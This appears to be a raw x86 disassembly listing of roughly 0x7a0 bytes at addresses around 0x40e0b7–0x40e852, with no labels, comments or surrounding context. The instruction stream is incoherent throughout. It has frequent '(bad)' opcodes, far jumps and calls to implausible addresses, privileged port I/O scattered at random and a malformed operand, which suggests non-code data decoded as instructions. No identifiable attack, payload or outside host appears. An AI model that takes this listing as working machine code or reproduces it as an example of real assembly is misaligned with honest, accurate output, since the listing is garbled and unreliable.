  40e0b7:	inc    ecx
  40e0b8:	mov    esp,0xd89d31cd
  40e0bd:	mov    al,0x98
  40e0bf:	xor    eax,0x2299b9ae
  40e0c4:	frstor [edi]
  40e0c6:	pop    ebp
  40e0c7:	jne    0x40e0be
  40e0c9:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0cb:	lods   al,BYTE PTR ds:[esi]
  40e0cc:	outs   dx,BYTE PTR ds:[esi]
  40e0cd:	mov    ds:0xe25ec418,al
  40e0d2:	aaa    
  40e0d3:	bound  esp,QWORD PTR [ecx+edi*4+0x1b]
  40e0d7:	test   DWORD PTR [ebp-0x7c],esi
  40e0da:	in     eax,dx
  40e0db:	fsubr  QWORD PTR [esi+ecx*8-0x1efc1a9e]
  40e0e2:	add    dh,BYTE PTR [edi+0xfe8bbc0]
  40e0e8:	pop    ebp
  40e0e9:	sar    DWORD PTR [ebx-0x44e19f6e],1
  40e0ef:	ficom  WORD PTR [edi+0x1]
  40e0f2:	out    0x6a,al
  40e0f4:	arpl   sp,dx
  40e0f6:	add    DWORD PTR [ecx],esi
  40e0f8:	je     0x40e13b
  40e0fa:	shl    BYTE PTR [edx+0x13],1
  40e0fd:	addr16 mov cl,0x93
  40e100:	adc    ecx,DWORD PTR [edi-0x1]
  40e103:	dec    esp
  40e104:	xor    BYTE PTR [di],0x80
  40e108:	data16 adc BYTE PTR [eax+0x5a],al
  40e10c:	mov    ds:0x7f5a6130,eax
  40e111:	pop    ebp
  40e112:	je     0x40e0fe
  40e114:	sbb    eax,0xffffff91
  40e117:	mov    cl,dh
  40e119:	mov    ch,al
  40e11b:	mov    al,0x21
  40e11d:	sub    BYTE PTR [ebx+0x231e8a96],ah
  40e123:	or     BYTE PTR [ecx+esi*1],bl
  40e126:	shl    DWORD PTR [eax+ecx*1],cl
  40e129:	adc    BYTE PTR [eax+0x3825d02b],al
  40e12f:	cdq    
  40e130:	and    BYTE PTR [ebx+0x3aafcbf3],ah
  40e136:	les    edi,FWORD PTR [edx+0x48]
  40e139:	imul   ecx,DWORD PTR [ecx+0x0],0xe5a93dd6
  40e140:	lods   al,BYTE PTR ds:[esi]
  40e141:	jno    0x42ee88fc
  40e147:	out    0xb1,eax
  40e149:	aam    0xa6
  40e14b:	mov    DWORD PTR [ebp-0x7b],ebx
  40e14e:	fwait
  40e14f:	and    al,0x59
  40e151:	or     DWORD PTR [edx+0x38],eax
  40e154:	mov    esp,0xc0a630b4
  40e159:	jne    0x40e0e8
  40e15b:	mov    ds:0x325a341d,eax
  40e160:	lahf   
  40e161:	inc    ecx
  40e162:	lea    eax,[ebx-0x37]
  40e165:	fnsave ds:0xa3c3afb4
  40e16b:	test   eax,0x392661ef
  40e170:	or     BYTE PTR [eax-0x766c431a],ch
  40e176:	aas    
  40e177:	scas   eax,DWORD PTR es:[edi]
  40e178:	push   es
  40e179:	adc    ebx,DWORD PTR [ecx+0x2a]
  40e17c:	rcl    DWORD PTR [ecx-0x64],cl
  40e17f:	xor    BYTE PTR [ecx-0x34],dh
  40e182:	stos   BYTE PTR es:[edi],al
  40e183:	das    
  40e184:	imul   eax,DWORD PTR [edx],0xcc06d8cf
  40e18a:	mov    edx,0x84e26834
  40e18f:	cmp    al,dh
  40e191:	iret   
  40e192:	addr16 inc edi
  40e194:	out    dx,al
  40e195:	sub    eax,0x58830992
  40e19a:	jb     0x40e202
  40e19c:	shl    BYTE PTR [edx+0x9],cl
  40e19f:	xchg   ebx,eax
  40e1a0:	pushf  
  40e1a1:	into   
  40e1a2:	or     ebx,DWORD PTR [eax-0x73265a16]
  40e1a8:	arpl   WORD PTR [esi+0x30],di
  40e1ab:	stos   DWORD PTR es:[edi],eax
  40e1ac:	dec    esp
  40e1ad:	aad    0xd1
  40e1af:	rcr    BYTE PTR [ecx+0x6266fbfd],1
  40e1b5:	mov    edi,0xcc51bf6e
  40e1ba:	sub    ch,BYTE PTR [esi-0x6b7cc35b]
  40e1c0:	push   ebx
  40e1c1:	cdq    
  40e1c2:	jge    0x40e179
  40e1c4:	xchg   edx,eax
  40e1c5:	outs   dx,DWORD PTR ds:[esi]
  40e1c6:	pop    eax
  40e1c7:	mov    BYTE PTR [ecx+0x6e],ch
  40e1ca:	push   esi
  40e1cb:	cmp    bl,BYTE PTR [eax-0x2d]
  40e1ce:	hlt    
  40e1cf:	mov    bl,BYTE PTR [ebx-0x78dd3f05]
  40e1d5:	js     0x40e17a
  40e1d7:	in     eax,0x1e
  40e1d9:	push   0x58
  40e1db:	loop   0x40e207
  40e1dd:	ins    BYTE PTR es:[edi],dx
  40e1de:	int    0xd1
  40e1e0:	fwait
  40e1e1:	ret    
  40e1e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1e3:	stc    
  40e1e4:	jmp    0xe2d9d309
  40e1e9:	je     0x40e262
  40e1eb:	add    BYTE PTR [edx-0x7444cb97],dl
  40e1f1:	daa    
  40e1f2:	stos   BYTE PTR es:[edi],al
  40e1f3:	aaa    
  40e1f4:	lahf   
  40e1f5:	lock dec ebx
  40e1f7:	lds    edx,FWORD PTR [ebp-0x55cd23c3]
  40e1fd:	outs   dx,BYTE PTR ds:[esi]
  40e1fe:	es xor dh,al
  40e201:	inc    esi
  40e202:	loop   0x40e224
  40e204:	push   ss
  40e205:	adc    esi,DWORD PTR [eax-0x1b]
  40e208:	xchg   ebx,eax
  40e209:	js     0x40e1c4
  40e20b:	std    
  40e20c:	(bad)  
  40e20d:	push   cs
  40e20e:	jp     0x40e207
  40e210:	fist   WORD PTR [esi+0x5fe6a1d0]
  40e216:	lahf   
  40e217:	mov    eax,ds:0xf0cba6e5
  40e21c:	push   edx
  40e21d:	inc    esi
  40e21e:	push   ss
  40e21f:	das    
  40e220:	inc    esp
  40e221:	xchg   ebx,eax
  40e222:	popf   
  40e223:	enter  0x19c7,0xba
  40e227:	xor    BYTE PTR [edi-0x77],ah
  40e22a:	pop    si
  40e22c:	xor    al,0x2a
  40e22e:	test   eax,0xf074d42f
  40e233:	sub    eax,0x4668ba96
  40e238:	mov    eax,ds:0x6137f3e4
  40e23d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e23e:	pop    eax
  40e23f:	int    0x68
  40e241:	push   edx
  40e242:	retf   0xf3e2
  40e245:	mov    cl,0xe6
  40e247:	xchg   ebp,eax
  40e248:	mov    dx,0xb60f
  40e24c:	or     BYTE PTR [esp+eax*2-0x46],0x42
  40e251:	jmp    0x40e1e3
  40e253:	cdq    
  40e254:	shl    BYTE PTR [eax],1
  40e256:	inc    esi
  40e257:	sub    bh,cl
  40e259:	jmp    FWORD PTR [ecx]
  40e25b:	jnp    0x40e1fe
  40e25d:	mov    esp,0x261f1fc6
  40e262:	aaa    
  40e263:	jecxz  0x40e2b7
  40e265:	inc    ebp
  40e266:	out    0xf3,al
  40e268:	xchg   esp,esi
  40e26a:	jb     0x40e2c4
  40e26c:	jecxz  0x40e28a
  40e26e:	cwde   
  40e26f:	test   al,0xdd
  40e271:	mov    cl,0xb8
  40e273:	icebp  
  40e274:	addr16 mov ah,0xa4
  40e277:	jnp    0x40e1fb
  40e279:	pop    es
  40e27a:	and    eax,0x208b28b1
  40e27f:	mov    ?,WORD PTR [eax+0x7ed93c58]
  40e285:	mov    eax,0x7b9bd577
  40e28a:	inc    eax
  40e28b:	outs   dx,DWORD PTR ds:[esi]
  40e28c:	(bad)  
  40e28d:	jno    0x40e248
  40e28f:	repz jg 0x40e266
  40e292:	mov    ds,WORD PTR [eax+0x6c]
  40e295:	(bad)  
  40e297:	sub    edx,DWORD PTR [ebx]
  40e299:	mov    al,0x44
  40e29b:	fsubr  st(7),st
  40e29d:	imul   ebx,DWORD PTR es:[ebx],0xffffff8b
  40e2a1:	inc    ebx
  40e2a2:	or     ch,dh
  40e2a4:	mov    edx,0x92bccd5
  40e2a9:	or     ebp,DWORD PTR [ebx]
  40e2ab:	mov    ds:0xfdcde72e,eax
  40e2b0:	xchg   edx,eax
  40e2b1:	aaa    
  40e2b2:	sub    DWORD PTR [edi+0x3c23a7f9],0xffffffa1
  40e2b9:	addr16 jmp 0x48b5:0x4f30ad5c
  40e2c1:	mov    bh,0xcd
  40e2c3:	mov    bl,0x5a
  40e2c5:	inc    edx
  40e2c6:	hlt    
  40e2c7:	inc    edi
  40e2c8:	mov    bh,0x7f
  40e2ca:	and    al,cl
  40e2cc:	cmp    bh,BYTE PTR [ecx]
  40e2ce:	test   DWORD PTR [ebp-0x3c],ecx
  40e2d1:	sbb    bl,al
  40e2d3:	mov    cl,0x23
  40e2d5:	push   0xffffffc4
  40e2d7:	fwait
  40e2d8:	test   al,0x8a
  40e2da:	dec    esp
  40e2db:	test   DWORD PTR [edx-0x7f94941a],edx
  40e2e1:	push   edx
  40e2e2:	mov    DWORD PTR [edi+eax*1-0x8],edx
  40e2e6:	jl     0x40e2ad
  40e2e8:	jg     0x40e33d
  40e2ea:	(bad)  
  40e2eb:	ds add dl,cl
  40e2ee:	or     esi,esp
  40e2f0:	mov    ebp,0x619b3a05
  40e2f5:	aaa    
  40e2f6:	je     0x40e362
  40e2f8:	adc    esi,DWORD PTR [eax-0x6a6a33dd]
  40e2fe:	out    0xa4,eax
  40e300:	mov    dl,bh
  40e302:	xchg   BYTE PTR [ecx+0x62a8551c],ch
  40e308:	call   0xd393:0xff8646cb
  40e30f:	jl     0x40e2dc
  40e311:	mov    ah,0x62
  40e313:	ins    DWORD PTR es:[edi],dx
  40e314:	imul   BYTE PTR [edx]
  40e316:	mov    ebp,0xfe10269c
  40e31b:	push   esi
  40e31c:	pop    ds
  40e31d:	xchg   ebx,eax
  40e31e:	add    esi,DWORD PTR [edx-0x5e30795f]
  40e324:	lahf   
  40e325:	cs data16 mov cl,0x4e
  40e329:	cmp    al,0x19
  40e32b:	dec    edx
  40e32c:	jb     0x40e31f
  40e32e:	(bad)
  40e331:	je     0x40e3a1
  40e333:	jae    0x40e387
  40e335:	pop    esp
  40e336:	jbe    0x40e2c5
  40e338:	fcmovu st,st(6)
  40e33a:	mov    bl,0xea
  40e33c:	add    eax,eax
  40e33e:	test   BYTE PTR [esi-0x4b15bd83],dh
  40e344:	inc    BYTE PTR [ebp+0x41]
  40e347:	outs   dx,BYTE PTR ds:[esi]
  40e348:	je     0x40e31c
  40e34a:	fcom   DWORD PTR [ecx+esi*8-0x58740c03]
  40e351:	ins    BYTE PTR es:[edi],dx
  40e352:	(bad)  
  40e353:	jp     0x40e354
  40e355:	daa    
  40e356:	(bad)  
  40e357:	pop    esi
  40e358:	retf   0xea0f
  40e35b:	xor    eax,0x5833b093
  40e360:	push   ebx
  40e361:	outs   dx,BYTE PTR ds:[esi]
  40e362:	test   BYTE PTR [esi],0x1a
  40e365:	mov    ds:0x9f897646,al
  40e36a:	jge    0x40e34e
  40e36c:	push   DWORD PTR [ebp+ebx*1-0x7a6830a2]
  40e373:	es popf 
  40e375:	xor    cl,BYTE PTR [eax+edx*4]
  40e378:	daa    
  40e379:	push   eax
  40e37a:	or     al,0xd6
  40e37c:	jmp    0xdba73f6c
  40e381:	(bad)  
  40e382:	jecxz  0x40e3ad
  40e384:	retf   
  40e385:	(bad)  
  40e386:	push   esi
  40e387:	or     al,0x25
  40e389:	std    
  40e38a:	pop    es
  40e38b:	mov    cl,0x67
  40e38d:	mov    ch,0x4
  40e38f:	sbb    ah,bl
  40e391:	sub    esp,DWORD PTR [eax-0x28ef6a4a]
  40e397:	push   DWORD PTR [edi+0x678c7d8a]
  40e39d:	sub    edi,DWORD PTR [esi]
  40e39f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3a0:	add    BYTE PTR [ecx-0x450fa010],ch
  40e3a6:	xlat   BYTE PTR ds:[ebx]
  40e3a7:	arpl   si,ax
  40e3a9:	inc    esp
  40e3aa:	dec    esi
  40e3ab:	mov    ecx,0xcca12ee0
  40e3b0:	lock pop ebx
  40e3b2:	outs   dx,DWORD PTR ds:[esi]
  40e3b3:	sub    eax,0x4cc40e2d
  40e3b8:	lea    ebx,[ebp+0x47e977fb]
  40e3be:	cs aaa 
  40e3c0:	add    ch,BYTE PTR gs:[eax+0x4d3ed0df]
  40e3c7:	jne    0x40e3ea
  40e3c9:	pop    ebp
  40e3ca:	cmp    eax,0x21b5e748
  40e3cf:	popf   
  40e3d0:	aas    
  40e3d1:	push   0xffffffe7
  40e3d3:	sub    DWORD PTR [ecx-0x78],edi
  40e3d6:	ins    BYTE PTR es:[edi],dx
  40e3d7:	xchg   BYTE PTR [edi],al
  40e3d9:	sub    al,0x78
  40e3db:	lods   al,BYTE PTR ds:[esi]
  40e3dc:	out    dx,al
  40e3dd:	cld    
  40e3de:	addr16 xchg esi,eax
  40e3e0:	inc    esi
  40e3e1:	mov    eax,0x38fd91fb
  40e3e6:	mov    ds:0xd26fc655,eax
  40e3eb:	aas    
  40e3ec:	adc    ah,bh
  40e3ee:	and    BYTE PTR [ecx+0x15],0x12
  40e3f2:	add    BYTE PTR [ecx+0x3d],cl
  40e3f5:	pop    es
  40e3f6:	sub    edi,eax
  40e3f8:	jl     0x40e46e
  40e3fa:	retf   
  40e3fb:	in     eax,dx
  40e3fc:	ds ret 
  40e3fe:	xchg   esp,edi
  40e400:	mov    esi,0x98d96928
  40e405:	push   ss
  40e406:	xchg   ebx,eax
  40e407:	adc    eax,0x45f6ce3e
  40e40c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e40d:	test   eax,0x107f6f3
  40e412:	fs scas al,BYTE PTR es:[edi]
  40e414:	adc    DWORD PTR [esp+ebx*1+0x48],0xffffff89
  40e419:	xor    edx,DWORD PTR [edi]
  40e41b:	sar    BYTE PTR [esi],0xe1
  40e41e:	and    al,0xb
  40e420:	dec    ebx
  40e421:	mov    cl,0xf4
  40e423:	gs ins BYTE PTR es:[edi],dx
  40e425:	jo     0x40e409
  40e427:	repnz lahf 
  40e429:	rcl    ebp,1
  40e42b:	pop    es
  40e42c:	xor    BYTE PTR [esp+0x40],bl
  40e430:	fimul  DWORD PTR [edx+0x2e4d5c46]
  40e436:	xchg   ecx,eax
  40e437:	adc    al,0x64
  40e439:	mov    ecx,0x52b8e292
  40e43e:	retf   
  40e43f:	aaa    
  40e440:	pushf  
  40e441:	mov    cl,0x38
  40e443:	lds    edi,FWORD PTR ss:[edi-0x578eafde]
  40e44a:	pop    ecx
  40e44b:	inc    ebp
  40e44c:	fsub   QWORD PTR [ecx+0x21]
  40e44f:	iret   
  40e450:	cld    
  40e451:	mov    edi,0x83011671
  40e456:	xor    bh,BYTE PTR [eax+0x54]
  40e459:	pop    ds
  40e45a:	cmpxchg DWORD PTR [ebp-0xf],ebp
  40e45e:	fcmovne st,st(1)
  40e460:	sub    DWORD PTR [ebx-0x12],ecx
  40e463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e464:	push   edi
  40e465:	sbb    al,ch
  40e467:	xchg   bh,bh
  40e469:	out    dx,eax
  40e46a:	rcr    BYTE PTR ds:0x12292223,cl
  40e470:	ss sub eax,0xf39a97aa
  40e476:	cmp    BYTE PTR [edx-0x16],ch
  40e479:	inc    esi
  40e47a:	pop    edx
  40e47b:	dec    esi
  40e47c:	clc    
  40e47d:	(bad)  
  40e47e:	and    edx,esi
  40e480:	pusha  
  40e481:	imul   edx,esp,0x3673c3aa
  40e487:	mov    eax,0x2420643d
  40e48c:	aaa    
  40e48d:	aas    
  40e48e:	push   es
  40e48f:	in     eax,dx
  40e490:	jns    0x40e45f
  40e492:	cmp    DWORD PTR [eax],esi
  40e494:	retf   0x9d76
  40e497:	inc    ecx
  40e498:	sbb    BYTE PTR [eax+0x2d224ed0],dl
  40e49e:	(bad)  
  40e49f:	dec    eax
  40e4a0:	mov    dl,0xf9
  40e4a2:	test   al,0x74
  40e4a4:	daa    
  40e4a5:	push   eax
  40e4a6:	mov    al,ds:0xb5fee62b
  40e4ab:	and    BYTE PTR [ebx-0x352895fb],ah
  40e4b1:	(bad)  
  40e4b3:	push   eax
  40e4b4:	pop    ss
  40e4b5:	sbb    eax,0x21fbf31b
  40e4ba:	mov    esp,0xf15039d9
  40e4bf:	lods   al,BYTE PTR ds:[esi]
  40e4c0:	mov    edi,0x9c9d11b
  40e4c5:	in     al,dx
  40e4c6:	out    dx,al
  40e4c7:	dec    ebx
  40e4c8:	xor    al,0xa
  40e4ca:	sbb    DWORD PTR [eax],eax
  40e4cc:	(bad)  [si]
  40e4cf:	mov    bl,0x5c
  40e4d1:	test   al,0x84
  40e4d3:	adc    eax,0x45b89e6
  40e4d8:	or     ebx,eax
  40e4da:	call   0x33b:0xd79f97b1
  40e4e1:	mov    bh,0xdb
  40e4e3:	popf   
  40e4e4:	mov    dl,0x74
  40e4e6:	icebp  
  40e4e7:	rol    DWORD PTR [edx+0x23],1
  40e4ea:	(bad)  
  40e4eb:	into   
  40e4ec:	pop    ecx
  40e4ed:	xchg   bh,bh
  40e4ef:	lahf   
  40e4f0:	mov    dh,0x31
  40e4f2:	jbe    0x40e511
  40e4f4:	(bad)  
  40e4f5:	xchg   esp,eax
  40e4f6:	inc    ebp
  40e4f7:	and    eax,0x62fa37a8
  40e4fc:	cmp    ch,bl
  40e4fe:	jmp    0x40e4aa
  40e500:	in     eax,dx
  40e501:	pop    ecx
  40e502:	push   es
  40e503:	dec    esp
  40e504:	xchg   edi,eax
  40e505:	jo     0x40e57f
  40e507:	adc    BYTE PTR cs:[eax-0x2fc695c0],ah
  40e50e:	sub    DWORD PTR [edi-0x42c42d90],ebx
  40e514:	retf   0x5609
  40e517:	int    0x2
  40e519:	dec    edx
  40e51a:	cmp    ah,ch
  40e51c:	jmp    0x5837:0x40f10055
  40e523:	and    al,BYTE PTR [edi]
  40e525:	imul   ecx,DWORD PTR [esp+ebp*4+0x66],0xb14de4c9
  40e52d:	sub    ebx,DWORD PTR [edx-0x1c41b599]
  40e533:	push   es
  40e534:	adc    DWORD PTR [esi],esi
  40e536:	stc    
  40e537:	(bad)  
  40e538:	pop    eax
  40e539:	jnp    0x40e4d4
  40e53b:	or     ebp,DWORD PTR [edi+0xce2db2a]
  40e541:	test   al,0x9e
  40e543:	push   es
  40e544:	mov    al,0xb1
  40e546:	xor    al,0x7a
  40e548:	shl    DWORD PTR [ebp-0x14],1
  40e54b:	cmp    esp,DWORD PTR [ecx-0x50]
  40e54e:	or     DWORD PTR [eax-0x52eda223],edx
  40e554:	test   BYTE PTR [edi-0x6eedf187],ch
  40e55a:	ret    
  40e55b:	dec    ebp
  40e55c:	pushf  
  40e55d:	and    esi,0x1d
  40e560:	mov    bh,0x49
  40e562:	jno    0x40e55d
  40e564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e565:	out    0xaa,al
  40e567:	adc    eax,0x48b11177
  40e56c:	sti    
  40e56d:	mov    dl,0x60
  40e56f:	jbe    0x40e525
  40e571:	sub    edi,DWORD PTR [ebp+0x34dd066c]
  40e577:	xor    BYTE PTR [ecx+0x20],al
  40e57a:	loope  0x40e537
  40e57c:	mov    ds:0x30f18387,eax
  40e581:	adc    edi,esi
  40e583:	inc    ebp
  40e584:	and    BYTE PTR [esi+0x5775af7e],bl
  40e58a:	sub    DWORD PTR [eax-0x76],ebp
  40e58d:	fdivr  DWORD PTR [esp+ebp*1-0x487230e2]
  40e594:	inc    esp
  40e595:	and    edx,DWORD PTR ds:0x3c7e62ec
  40e59b:	mov    edi,0x8c7cf8b1
  40e5a0:	sub    DWORD PTR [esi-0x29015897],edi
  40e5a6:	push   es
  40e5a7:	sti    
  40e5a8:	and    ch,BYTE PTR [esi]
  40e5aa:	ja     0x40e5c9
  40e5ac:	imul   edx,ecx,0x8b646f28
  40e5b2:	dec    esi
  40e5b3:	xor    bl,0x3
  40e5b6:	xchg   ebp,eax
  40e5b7:	pop    es
  40e5b8:	cmc    
  40e5b9:	and    eax,0x4f9d836e
  40e5be:	jg     0x40e616
  40e5c0:	push   edi
  40e5c1:	inc    ecx
  40e5c2:	ins    DWORD PTR es:[edi],dx
  40e5c3:	lahf   
  40e5c4:	not    ebp
  40e5c6:	pushf  
  40e5c7:	ret    
  40e5c8:	cs mov dh,0x48
  40e5cb:	arpl   WORD PTR [ebx+edx*4+0x45f1b4a1],dx
  40e5d2:	in     al,dx
  40e5d3:	adc    edi,DWORD PTR [edi]
  40e5d5:	out    0x7,al
  40e5d7:	rol    DWORD PTR [ebp-0x4c],0xab
  40e5db:	retfw  
  40e5dd:	sub    al,0x38
  40e5df:	jge    0x40e63f
  40e5e1:	xor    eax,0x3fb62c70
  40e5e6:	xchg   ebx,eax
  40e5e7:	dec    esp
  40e5e8:	aas    
  40e5e9:	xor    edx,DWORD PTR [edx-0x1a5cf055]
  40e5ef:	mov    edi,0xa2a0caa1
  40e5f4:	loopne 0x40e674
  40e5f6:	enter  0x15b4,0x65
  40e5fa:	mov    ds:0x517afba9,al
  40e5ff:	sub    al,BYTE PTR [edi+0x70]
  40e602:	mov    al,ds:0x7ac245aa
  40e607:	xor    DWORD PTR [ebp+0x56327587],ebx
  40e60d:	(bad)  
  40e60e:	inc    eax
  40e60f:	int3   
  40e610:	(bad)  
  40e612:	out    0xb5,eax
  40e614:	test   DWORD PTR [edi+0x2b6d7413],ebx
  40e61a:	test   BYTE PTR [eax],ah
  40e61c:	and    ebp,ebx
  40e61e:	jno    0x40e654
  40e620:	sbb    ch,BYTE PTR [edi]
  40e622:	inc    edi
  40e623:	mov    dl,0xd9
  40e625:	pop    edx
  40e626:	jne    0x40e5d0
  40e628:	mov    eax,0x4685af11
  40e62d:	repnz fwait
  40e62f:	dec    ecx
  40e630:	rcr    cl,1
  40e632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e633:	rcl    DWORD PTR ds:0xac0ca811,cl
  40e639:	or     bh,BYTE PTR [ecx-0x7f]
  40e63c:	mov    al,ds:0x9004c9d7
  40e641:	mov    eax,0x19141c16
  40e646:	xchg   DWORD PTR [ebx+0x48a1602],esi
  40e64c:	rcr    BYTE PTR [esi+0x1aafd39e],0x46
  40e653:	ds mov eax,0xf50c0f1d
  40e659:	pop    DWORD PTR [edi+ebp*1]
  40e65c:	cmp    ch,bl
  40e65e:	(bad)  
  40e65f:	mov    edx,0x3963bb69
  40e664:	mov    edx,0x3b3e99e7
  40e669:	call   0xf5f0f562
  40e66e:	test   al,0xc8
  40e670:	in     eax,dx
  40e671:	shr    ebp,1
  40e673:	(bad)  
  40e674:	loop   0x40e670
  40e676:	ds (bad) 
  40e678:	fsubr  QWORD PTR [eax+edx*1]
  40e67b:	bound  ebp,QWORD PTR [ebx+edx*8]
  40e67e:	mov    al,0x6
  40e680:	mov    ds:0xa116df17,eax
  40e685:	in     eax,0x6e
  40e687:	adc    bl,dl
  40e689:	shl    DWORD PTR [ebx],0x70
  40e68c:	inc    eax
  40e68d:	cmp    eax,0x9282daa7
  40e692:	pop    ebx
  40e693:	inc    ebp
  40e694:	push   ebp
  40e695:	rol    ah,cl
  40e697:	ins    DWORD PTR es:[edi],dx
  40e698:	xor    al,dl
  40e69a:	sbb    dl,BYTE PTR [eax-0x1f]
  40e69d:	lods   al,BYTE PTR es:[esi]
  40e69f:	call   FWORD PTR [edx+0x7e]
  40e6a2:	fcom   st(4)
  40e6a4:	js     0x40e6e8
  40e6a6:	outs   dx,DWORD PTR ds:[esi]
  40e6a7:	dec    ebx
  40e6a8:	mov    eax,0x85133aae
  40e6ad:	in     al,dx
  40e6ae:	repnz or edx,DWORD PTR ds:0x6cb926cd
  40e6b5:	cmp    ch,BYTE PTR [ecx]
  40e6b7:	scas   eax,DWORD PTR es:[edi]
  40e6b8:	xchg   esp,edx
  40e6ba:	or     dh,bh
  40e6bc:	(bad)  
  40e6bd:	xlat   BYTE PTR ds:[ebx]
  40e6be:	jno    0x40e691
  40e6c0:	ins    DWORD PTR es:[edi],dx
  40e6c1:	mov    ecx,0x86fda4ce
  40e6c6:	jo     0x40e716
  40e6c8:	xchg   edx,eax
  40e6c9:	cs mov ebx,cs
  40e6cc:	lea    ebx,[ebx-0x4dc5ce38]
  40e6d2:	aaa    
  40e6d3:	ret    
  40e6d4:	jge    0x40e6a6
  40e6d6:	hlt    
  40e6d7:	clc    
  40e6d8:	dec    eax
  40e6d9:	push   eax
  40e6da:	mov    edi,0x9a422e81
  40e6df:	sahf   
  40e6e0:	inc    ecx
  40e6e1:	cmp    DWORD PTR [eax+0x19],edx
  40e6e4:	enter  0x71e3,0xf0
  40e6e8:	or     edx,DWORD PTR [ebx-0x55]
  40e6eb:	push   0xf08707a7
  40e6f0:	adc    dh,bh
  40e6f2:	dec    esp
  40e6f3:	mov    ebp,0xad5004b
  40e6f8:	inc    esi
  40e6f9:	adc    bl,BYTE PTR [edx+0x24e73730]
  40e6ff:	dec    edx
  40e700:	ror    BYTE PTR [eax],cl
  40e702:	dec    edx
  40e703:	(bad)  
  40e704:	sub    DWORD PTR [edx],esp
  40e706:	and    eax,0xad957eb
  40e70b:	mov    ds:0x55aff984,eax
  40e710:	fnstenv [ebx]
  40e712:	push   ss
  40e713:	sbb    al,ch
  40e715:	cld    
  40e716:	std    
  40e717:	(bad)  
  40e719:	mov    al,0x5e
  40e71b:	mov    cl,0xe0
  40e71d:	sub    BYTE PTR [esi-0x7b],dh
  40e720:	call   0xd0d6:0xde116a17
  40e727:	scas   eax,DWORD PTR es:[edi]
  40e728:	out    dx,eax
  40e729:	sub    eax,0x4f05bf84
  40e72e:	mov    eax,ds:0xd3a3623d
  40e733:	pop    esi
  40e734:	loop   0x40e77c
  40e736:	pop    ecx
  40e737:	or     eax,0xb23a7bc5
  40e73c:	call   0x77f3:0x4eaed314
  40e743:	inc    esi
  40e744:	xlat   BYTE PTR ds:[ebx]
  40e745:	fdiv   st,st(3)
  40e747:	push   ebp
  40e748:	jno    0x40e799
  40e74a:	icebp  
  40e74b:	leave  
  40e74c:	shr    BYTE PTR [esi+0x3d],1
  40e74f:	mov    edi,0x1c55c9f4
  40e754:	pop    ebp
  40e755:	adc    esp,DWORD PTR [ebx-0x11]
  40e758:	pop    ds
  40e759:	or     al,0x7e
  40e75b:	mov    ch,0xbd
  40e75d:	out    dx,eax
  40e75e:	lea    edx,[ecx-0x2]
  40e761:	pop    eax
  40e762:	mov    bh,0x31
  40e764:	js     0x40e728
  40e766:	pop    ebp
  40e767:	into   
  40e768:	aas    
  40e769:	fdivr  st,st(6)
  40e76b:	in     al,dx
  40e76c:	sub    ecx,DWORD PTR [ecx+0x3d]
  40e76f:	xor    bp,bp
  40e772:	fisubr DWORD PTR [ebp-0x6f248fdc]
  40e778:	sbb    DWORD PTR [edx],edi
  40e77a:	enter  0x7e5d,0xb5
  40e77e:	jne    0x40e74f
  40e780:	out    dx,eax
  40e781:	cs cwde 
  40e783:	out    0xb2,al
  40e785:	test   DWORD PTR [ebx-0x7f],0xf84f13c3
  40e78c:	cld    
  40e78d:	and    eax,0x1e23f12d
  40e792:	jmp    0x8497:0x7b931687
  40e799:	cmp    DWORD PTR ds:0x35f5705e,0x2
  40e7a0:	stos   DWORD PTR es:[edi],eax
  40e7a1:	add    al,0xd4
  40e7a3:	rcr    DWORD PTR [edx+0x3511d28f],1
  40e7a9:	mov    BYTE PTR [ebx+0x53],0x3c
  40e7ad:	or     DWORD PTR [esi],0xfe7bb889
  40e7b3:	(bad)  
  40e7b4:	in     eax,0xb
  40e7b6:	ret    0xf06f
  40e7b9:	pop    edx
  40e7ba:	push   esp
  40e7bb:	cdq    
  40e7bc:	and    al,BYTE PTR [ecx-0x49]
  40e7bf:	fisubr WORD PTR [di-0x41]
  40e7c3:	cmc    
  40e7c4:	jp     0x40e769
  40e7c6:	lea    ebp,[edx+eiz*8+0x715498dc]
  40e7cd:	xchg   DWORD PTR [ebp+eax*8+0x580be70],esi
  40e7d4:	fs nop
  40e7d6:	mov    ebx,0x3b5dc857
  40e7dc:	adc    al,0x68
  40e7de:	mov    edi,0x4178271b
  40e7e3:	jb     0x40e831
  40e7e5:	and    al,0x76
  40e7e7:	mov    ch,0x96
  40e7e9:	xchg   esi,eax
  40e7ea:	add    ch,BYTE PTR ds:0xfd765f43
  40e7f0:	iret   
  40e7f1:	xor    BYTE PTR [edx+eiz*8-0xf],ah
  40e7f5:	inc    eax
  40e7f6:	mov    ds:0x74a9f74b,eax
  40e7fb:	push   esi
  40e7fc:	lea    ebx,[eax-0x6c7712ff]
  40e802:	inc    ecx
  40e803:	(bad)  
  40e804:	fmul   st(5),st
  40e806:	inc    ebp
  40e807:	sar    DWORD PTR [ecx+ebp*4+0x1e],0xc2
  40e80c:	hlt    
  40e80d:	or     DWORD PTR [eax-0x385a6713],ebx
  40e813:	aam    0xe0
  40e815:	or     eax,0x80de4b0
  40e81a:	jns    0x40e81b
  40e81c:	pop    eax
  40e81d:	dec    esi
  40e81e:	add    bh,dl
  40e820:	and    eax,0xa802869b
  40e825:	pop    ecx
  40e826:	scas   eax,DWORD PTR es:[edi]
  40e827:	addr16 jbe 0x40e7dd
  40e82a:	push   eax
  40e82b:	je     0x40e89d
  40e82d:	clc    
  40e82e:	mov    cl,0x99
  40e830:	icebp  
  40e831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e832:	mov    esi,0xe97d63ab
  40e837:	push   ebp
  40e838:	popa   
  40e839:	inc    ebp
  40e83a:	dec    edx
  40e83b:	test   al,0x6a
  40e83d:	pop    ebp
  40e83e:	push   edi
  40e83f:	and    ecx,DWORD PTR [esp+ebx*8+0x1c]
  40e843:	lds    esp,FWORD PTR [ebp-0x884b5fe]
  40e849:	sbb    BYTE PTR gs:0x14bc0d44,0xbc
  40e851:	popa   
  40e852:	test   BYTE PTR [esp+ecx*8-0x7202679],ah
